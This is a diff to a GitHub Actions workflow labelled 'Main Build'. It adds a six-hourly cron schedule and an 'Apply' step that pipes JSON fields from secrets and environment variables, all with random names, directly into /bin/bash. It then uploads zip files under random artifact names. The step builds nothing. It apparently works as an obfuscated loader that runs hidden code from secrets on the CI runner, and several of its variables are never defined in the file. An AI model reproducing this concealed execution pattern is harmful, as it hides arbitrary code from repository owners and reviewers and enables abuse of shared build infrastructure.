@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '24 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Apply
         env:
-          nfbo9843: ${{ secrets.nfbo9843 }}
+          brmp865: ${{ secrets.brmp865 }}
         run: |
-          printf '%s' "$nfbo9843" | jq -r .bbuuw98444 | /bin/bash
-          echo $mym292 | jq -r .uyumy4 | /bin/bash
-          printf '%s' "$wfbd32" | jq -r .ikdd738 | /bin/bash
-          echo $hno652 | jq -r .jghy61 | /bin/bash
+          printf '%s' "$brmp865" | jq -r .wyovk7751 | /bin/bash
+          printf '%s' "$djzz0" | jq -r .u659 | /bin/bash
+          echo $kop51234 | jq -r .mg5 | /bin/bash
+          printf '%s' "$am3038" | jq -r .s35440 | /bin/bash
+          printf '%s' "$vo05310" | jq -r .oj32485 | /bin/bash
+          printf '%s' "$jakvo7133" | jq -r .pxoy3 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
         with:
-          name: BuzY7FyG
+          name: Q12MJ36X
           path: "*.zip"
           retention-days: 1
